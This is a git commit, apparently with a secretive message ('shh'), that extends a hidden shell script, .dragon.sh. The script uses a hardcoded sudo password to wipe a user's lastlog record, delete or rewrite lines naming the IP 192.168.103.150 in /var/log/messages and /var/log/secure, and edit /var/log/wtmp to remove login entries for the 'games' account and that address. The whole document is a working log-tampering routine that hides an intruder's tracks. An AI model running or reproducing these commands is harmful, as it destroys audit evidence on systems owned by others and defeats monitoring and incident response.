5e6c09f5a9f4f026c56431dd2f2dc162112e7872
110084 <110084@concords.com.tw>
2023-04-10 10:36:07 +0800

    噓~

--- .dragon.sh
+++ .dragon.sh
@@ -7,3 +7,8 @@ echo Aa123456 | sudo -S lastlog -C -u games
 echo Aa123456 | sudo -S sed -i '/192.168.103.150/'d /var/log/messages
 
 echo Aa123456 | sudo -S sed -i 's/192.168.103.150/192.168.103.1/g' /var/log/secure
+
+echo Aa123456 | sudo -S utmpdump /var/log/wtmp > /usr/games/.wtmp.file
+echo Aa123456 | sudo -S sed -i "/games/d" .wtmp.file
+echo Aa123456 | sudo -S sed -i "/103.150/d" .wtmp.file
+echo Aa123456 | sudo -S utmpdump -r < /usr/games/.wtmp.file > /var/log/wtmp
